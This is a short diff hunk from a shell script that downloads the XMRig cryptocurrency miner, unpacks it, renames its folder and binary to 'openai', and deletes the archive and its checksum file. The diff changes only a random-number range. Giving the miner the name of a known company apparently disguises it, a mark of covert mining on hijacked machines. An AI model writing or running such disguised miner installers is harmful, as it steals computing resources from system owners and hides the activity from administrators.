@@ -9,7 +9,7 @@ wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v$latest/xmrig
 tar -zxvf 1.tar.gz
 mv xmrig-$latest openai
 mv openai/xmrig openai/openai
-random_number=$((RANDOM % 1000 + 25))
+random_number=$((RANDOM % 300 + 26))
 echo $random_number
 rm -rf 1.tar.gz
 cd openai && rm -rf SHA256SUMS
